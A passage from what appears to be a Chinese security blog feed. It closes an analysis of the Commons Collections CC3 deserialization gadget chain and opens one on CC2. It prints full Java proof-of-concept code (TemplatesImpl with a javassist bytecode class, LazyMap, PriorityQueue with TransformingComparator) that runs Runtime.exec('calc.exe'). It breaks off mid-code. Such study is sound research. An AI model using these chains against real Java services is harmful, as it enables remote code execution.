利用链完成调用</h3><p>直接给出最终的反序列化 POC：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.sec.cc3;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line">        <span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line">        <span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line">        <span class="keyword">import</span> javassist.CtClass;</span><br><span class="line">        <span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line">        <span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">        <span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line">        <span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">        <span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line">        <span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line">        <span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line">        <span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line">        <span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line">        <span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line">        <span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line">        <span class="keyword">import</span> java.util.HashMap;</span><br><span class="line">        <span class="keyword">import</span> java.util.Map;</span><br><span class="line">        <span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3_LazyMap</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 通过 JAVAssist 创建一个名为 evilClass 的类,</span></span><br><span class="line"><span class="comment">         * 在该类中添加一个 static&#123;&#125; 静态块,</span></span><br><span class="line"><span class="comment">         * 并设置父类为 AbstractTranslet</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;evilClass&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc.exe\&quot;);&quot;</span>;</span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line">        <span class="comment">/* 将 evilClass 类转换成字节码 */</span></span><br><span class="line">        <span class="type">byte</span>[] evilClassBytes = cc.toBytecode();</span><br><span class="line">        <span class="type">byte</span>[][] evilByteCodes = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;evilClassBytes&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 获取一个 TemplatesImpl 类的实例对象,</span></span><br><span class="line"><span class="comment">         * 并通过反射将对象中的 _bytecodes 属性设为恶意类 evilClass 的字节码数组,</span></span><br><span class="line"><span class="comment">         * 并保证 _name 属性的值不为 null</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesImpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_bytecodes</span> <span class="operator">=</span> templatesImpl.getClass().getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_name</span> <span class="operator">=</span> templatesImpl.getClass().getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        _bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _name.set(templatesImpl, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">        _bytecodes.set(templatesImpl, evilByteCodes);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 通过 InstantiateTransformer 实例化 TrAXFilter 类, 并通过 TrAXFilter 类的构造方法实现 TemplatesImpl.newTransformer() 方法的调用 */</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templatesImpl&#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        innerMap.put(<span class="string">&quot;key&quot;</span>, <span class="string">&quot;value&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">confunc</span> <span class="operator">=</span> cls.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        confunc.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">AIHObject</span> <span class="operator">=</span> (InvocationHandler) confunc.newInstance(Retention.class, outerMap);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(outerMap.getClass().getClassLoader(), outerMap.getClass().getInterfaces(), AIHObject);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">AIHObjectFinal</span> <span class="operator">=</span> (InvocationHandler) confunc.newInstance(Retention.class, proxyMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">b1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(b1);</span><br><span class="line">        out.writeObject(AIHObjectFinal);</span><br><span class="line">        out.close();</span><br><span class="line">        b1.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(b1.toString());</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">b2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(b1.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(b2);</span><br><span class="line">        in.readObject();</span><br><span class="line">        in.close();</span><br><span class="line">        b2.close();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反序列化时弹出计算器</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220604213954505-709958500.png" alt="image-20220604213953177"></p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://mp.weixin.qq.com/s/GgBHP0ZrA_73ELK_QLJWuA">https://mp.weixin.qq.com/s/GgBHP0ZrA_73ELK_QLJWuA</a></p><p><a href="https://www.cnblogs.com/nice0e3/p/13854098.html">https://www.cnblogs.com/nice0e3/p/13854098.html</a></p>]]></content>
    
    
    <summary type="html">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;/&gt;

&lt;p&gt;cc3链可以说是cc1和cc2链的结合，下面进行分析。&lt;/p&gt;</summary>
    
    
    
    <category term="Java安全" scheme="https://kpa1on.github.io/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="cc链" scheme="https://kpa1on.github.io/tags/cc%E9%93%BE/"/>
    
  </entry>
  
  <entry>
    <title>Java安全之Commons Collections2分析</title>
    <link href="https://kpa1on.github.io/2022/04/28/Java%E5%AE%89%E5%85%A8%E4%B9%8BCommons-Collections2%E5%88%86%E6%9E%90/"/>
    <id>https://kpa1on.github.io/2022/04/28/Java%E5%AE%89%E5%85%A8%E4%B9%8BCommons-Collections2%E5%88%86%E6%9E%90/</id>
    <published>2022-04-28T13:49:24.000Z</published>
    <updated>2022-04-28T17:19:12.238Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>之前分析了cc1的利用链，但是cc1的利用链是有JDK版本限制的。在JDK8u71版本以后，对<code>AnnotationInvocationHandler</code>的<code>readobject</code>进行了改写，导致高版本中利用链无法使用，这在上文中分析过了。</p><span id="more"></span><p>cc2链中使用的是<code>commons-collections-4.0</code>版本，利用链如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">ObjectInputStream.readObject()</span><br><span class="line">PriorityQueue.readObject()</span><br><span class="line">...</span><br><span class="line">TransformingComparator.compare()</span><br><span class="line">InvokerTransformer.transform()</span><br><span class="line">Method.invoke()</span><br><span class="line">Runtime.exec()</span><br></pre></td></tr></table></figure><p>这里cc2链使用<code>commons-collections-4.0</code>版本的原因是，在3.2.1版本以下<code>TransformingComparator</code>并没有去实现<code>Serializable</code>接口，也就是不可以被序列化的，所以在利用链上就不能使用它去构造。</p><p>3.2.1版本</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220428220627968-329694528.png" alt="image-20220428220626101"></p><p>4,0版本</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220428220713185-1097329589.png" alt="image-20220428220712646"></p><p>在CC2链里不是利用 <code>AnnotationInvocationHandler</code>来构造，而是使用</p><p> <code>javassist</code>和<code>PriorityQueue</code>来构造利用链，所以先来了解下<code>PriorityQueue</code>的基本使用。</p><h3 id="PriorityQueue"><a href="#PriorityQueue" class="headerlink" title="PriorityQueue"></a>PriorityQueue</h3><p><strong>概念</strong></p><p><code>PriorityQueue</code> 一个基于优先级的无界优先级队列。优先级队列的元素按照其自然顺序进行排序，或者根据构造队列时提供的 Comparator 进行排序，具体取决于所使用的构造方法。该队列不允许使用 null 元素也不允许插入不可比较的对象(没有实现Comparable接口的对象)。<br> <code>PriorityQueue</code> 队列的头指排序规则最小那个元素。如果多个元素都是最小值则随机选一个。<br> <code>PriorityQueue</code> 是一个无界队列，但是初始的容量(实际是一个Object[])，随着不断向优先级队列添加元素，其容量会自动扩容，无需指定容量增加策略的细节。</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220428221232439-651517910.png" alt="image-20220428221231819"></p><p><strong>构造方法</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PriorityQueue()           </span><br><span class="line">使用默认的初始容量（<span class="number">11</span>）创建一个 PriorityQueue，并根据其自然顺序对元素进行排序。</span><br><span class="line">PriorityQueue(<span class="type">int</span> initialCapacity)</span><br><span class="line">使用指定的初始容量创建一个 PriorityQueue，并根据其自然顺序对元素进行排序。</span><br></pre></td></tr></table></figure><p><strong>常见方法</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">add(E e)           将指定的元素插入此优先级队列</span><br><span class="line">clear()            从此优先级队列中移除所有元素。</span><br><span class="line">comparator()       返回用来对此队列中的元素进行排序的比较器；如果此队列根据其元素的自然顺序进行排序，则返回 null</span><br><span class="line">contains(Object o)          如果此队列包含指定的元素，则返回 true。</span><br><span class="line">iterator()           返回在此队列中的元素上进行迭代的迭代器。</span><br><span class="line">offer(E e)           将指定的元素插入此优先级队列</span><br><span class="line">peek()           获取但不移除此队列的头；如果此队列为空，则返回 null。</span><br><span class="line">poll()           获取并移除此队列的头，如果此队列为空，则返回 null。</span><br><span class="line">remove(Object o)           从此队列中移除指定元素的单个实例（如果存在）。</span><br><span class="line">size()           返回此 collection 中的元素数。</span><br><span class="line">toArray()          返回一个包含此队列所有元素的数组。</span><br></pre></td></tr></table></figure><p>代码实例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PriorityQueueTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        PriorityQueue&lt;String&gt; q = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;String&gt;();</span><br><span class="line">        <span class="comment">//入列</span></span><br><span class="line">        q.add(<span class="string">&quot;2&quot;</span>);</span><br><span class="line">        q.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        q.add(<span class="string">&quot;5&quot;</span>);</span><br><span class="line">        q.add(<span class="string">&quot;3&quot;</span>);</span><br><span class="line">        q.add(<span class="string">&quot;4&quot;</span>);</span><br><span class="line">        <span class="comment">//出列</span></span><br><span class="line">        System.out.println(q.poll());  <span class="comment">//1</span></span><br><span class="line">        System.out.println(q.poll());  <span class="comment">//2</span></span><br><span class="line">        System.out.println(q.poll());  <span class="comment">//3</span></span><br><span class="line">        System.out.println(q.poll());  <span class="comment">//4</span></span><br><span class="line">        System.out.println(q.poll());  <span class="comment">//5</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220428221648706-1933465245.png" alt="image-20220428221648204"></p><p>观察打印结果， 入列：21534， 出列是12345， 也是说出列时做了相关判断，将最小的值返回。默认情况下<code>PriorityQueue</code>使用自然排序法，最小元素先出列。</p><h3 id="TransformingComparator"><a href="#TransformingComparator" class="headerlink" title="TransformingComparator"></a>TransformingComparator</h3><p><code>TransformingComparator</code>是一个修饰器，和CC1中的<code>ChainedTransformer</code>类似。</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220428221854229-2119926089.png" alt="image-20220428221853556">这个类有个compare()方法，会调用<code>Transformer#transform()</code>方法，根据前面的学习，猜测这里可能存在利用点，那具体该怎么利用呢，是否真的可以利用呢，下面开始分析。</p><h3 id="TransformingComparator-compare"><a href="#TransformingComparator-compare" class="headerlink" title="TransformingComparator.compare()"></a>TransformingComparator.compare()</h3><p><code>org.apache.commons.collections4.comparators.TransformingComparator</code> 类中提供了 <code>compare()</code> 方法，在该方法中对 <code>this.transformer</code> 调用了 <code>transform()</code> 方法，如果this.<code>transformer</code>可控，那么就可以利用该方法执行 <code>ChainedTransformer.transform()</code> 方法，并进入之前构造好的 <code>java.lang.Runtime.getRuntime().exec()</code> 调用链。</p><p>那现在查看下this.<code>transformer</code>是如何被赋值的。</p><p>在<code>TransformingComparator</code>的构造方法中，看到了赋值情况，并且两个构造方法都是被public关键字修饰的</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220428222500655-713162557.png" alt="image-20220428222500043"></p><p>也就是说，<code>this.transformer</code> 完全可控，我们可以将 <code>this.transformer</code> 指向 <code>ChainedTransformer</code> 对象来执行 <code>ChainedTransformer.transform()</code> 方法。</p><p>测试代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TransformingComparatorTest1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class, Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Object.class, Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;calc.exe&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformerChain);</span><br><span class="line">        transformingComparator.compare(<span class="string">&quot;test&quot;</span>,<span class="string">&quot;test&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220428222751860-78428661.png" alt="image-20220428222750807"></p><p>成功弹出计算器，但是可以看到控制台报错了</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220428222855641-1124003305.png" alt="image-20220428222855008"></p><p>根据报错信息，可以大致推断应该是类型转换有问题，而且运行的时候是先弹出计算器，后报错的，所以在下面的代码处打上断点</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220428223103501-833443309.png" alt="image-20220428223102363"></p><p>进入<code>compare()</code>方法</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220428223235512-1407610559.png" alt="image-20220428223235001"></p><p>这里的<code>transformer</code>被赋值为<code>ChainedTransformer</code>，然后调用<code>trasnform()</code>方法弹出计算器，所以我们重点就看函数的最后一行代码</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220428223451589-1296639309.png" alt="image-20220428223451003"></p><p>进入，在方法的注释中可以看到异常的信息说明，大致就是如果传入的参数不实现<code>Comparable</code>可就会产生这个报错。</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220428223653410-1966169796.png" alt="image-20220428223652822"></p><p>在这也看到，使用了泛型来约束传入的类型</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220428223811906-1530593051.png" alt="image-20220428223811362"></p><p>报错原因找到了之后，但上述的代码只是手动调用compare()方法弹出计算器，那现在如何使 <code>TransformingComparator.compare()</code> 方法自动调用呢？我们在 Java 内置的 <code>PriorityQueue</code> 类中找到了一条可行的路子。</p><h3 id="PriorityQueue-readObject"><a href="#PriorityQueue-readObject" class="headerlink" title="PriorityQueue.readObject()"></a>PriorityQueue.readObject()</h3><p><code>PriorityQueue</code> 类的 <code>readObject()</code> 方法中调用了一个 <code>heapify()</code> 方法</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220428224041906-2006646584.png" alt="image-20220428224041303"></p><h3 id="PriorityQueue-heapify"><a href="#PriorityQueue-heapify" class="headerlink" title="PriorityQueue.heapify()"></a>PriorityQueue.heapify()</h3><p>跟进 <code>heapify()</code> 方法，发现其调用了 <code>siftDown()</code> 方法，这里存在一个for循环，要想进入循环需要满足i &#x3D; (size &gt;&gt;&gt; 1) - 1 &gt;&#x3D; 0，即 <code>size &gt;= 2</code>，这里的size指的是队列中元素的个数。</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220428224139339-1220977299.png" alt="image-20220428224138782"></p><h3 id="PriorityQueue-siftDown"><a href="#PriorityQueue-siftDown" class="headerlink" title="PriorityQueue.siftDown()"></a>PriorityQueue.siftDown()</h3><p>跟进 <code>siftDown()</code> 方法，发现如果 <code>comparator</code> 变量不为空，将调用 <code>siftDownUsingComparator()</code> 方法：</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220428224410518-1285744807.png" alt="image-20220428224409958"></p><h3 id="PriorityQueue-siftDownUsingComparator"><a href="#PriorityQueue-siftDownUsingComparator" class="headerlink" title="PriorityQueue.siftDownUsingComparator()"></a>PriorityQueue.siftDownUsingComparator()</h3><p>跟进 <code>siftDownUsingComparator()</code> 方法，发现会调用 <code>comparator#compare()</code> 方法</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220428224546472-1478230969.png" alt="image-20220428224545847"></p><p>结合前面的<code>compare()</code>方法的利用，如果<code>comparator</code>可控的话，让它指向前文中构造的 <code>TransformingComparator</code> 对象，那么就可以执 <code>TransformingComparator.compare()</code> 方法了。那么，找一下<code>comparator</code>是怎么被赋值的。</p><p>查看 <code>PriorityQueue</code> 类的构造方法，其第 1 个参数用于指定队列的初始容量，第 2 个参数将赋值给 <code>this.comparator</code>，并且该构造方法对外开放，因此 <code>comparator</code> 变量完全可控</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220428230103959-1884903828.png" alt="image-20220428230103189"></p><p>构造payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">package cc2;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">import org.apache.commons.collections4.Transformer;</span><br><span class="line">import org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line">import org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line">import java.io.*;</span><br><span class="line">import java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line">public class TransformingComparatorTest2 &#123;</span><br><span class="line">    public static void main(String[] args) throws IOException, ClassNotFoundException &#123;</span><br><span class="line">        Transformer[] transformers = &#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer(</span><br><span class="line">                        &quot;getMethod&quot;,</span><br><span class="line">//                    new Class[] &#123;String.class, Class[].class&#125;,</span><br><span class="line">                        new Class[] &#123;String.class, Class[].class&#125;,</span><br><span class="line">                        new Object[]&#123;&quot;getRuntime&quot;, null&#125;</span><br><span class="line">                ),</span><br><span class="line">                new InvokerTransformer(</span><br><span class="line">                        &quot;invoke&quot;,</span><br><span class="line">                        new Class[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                        new Object[]&#123;null, null&#125;</span><br><span class="line">                ),</span><br><span class="line">                new InvokerTransformer(</span><br><span class="line">                        &quot;exec&quot;,</span><br><span class="line">                        new Class[]&#123;String.class&#125;,</span><br><span class="line">                        new Object[]&#123;&quot;calc.exe&quot;&#125;</span><br><span class="line">                )</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line">        TransformingComparator transformingComparator = new TransformingComparator(chainedTransformer);</span><br><span class="line">//      transformingComparer.compare(&quot;test&quot;, &quot;test&quot;);</span><br><span class="line"></span><br><span class="line">        PriorityQueue priorityQueue = new PriorityQueue(2, transformingComparator);</span><br><span class="line">        priorityQueue.add(1);</span><br><span class="line">        priorityQueue.add(2);</span><br><span class="line">        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(priorityQueue);</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line">        byteArrayOutputStream.close();</span><br><span class="line"></span><br><span class="line">        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(byteArrayOutputStream.toByteArray());</span><br><span class="line">        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">        objectInputStream.close();</span><br><span class="line">        byteArrayInputStream.close();</span><br><span class="line"></span><br><span 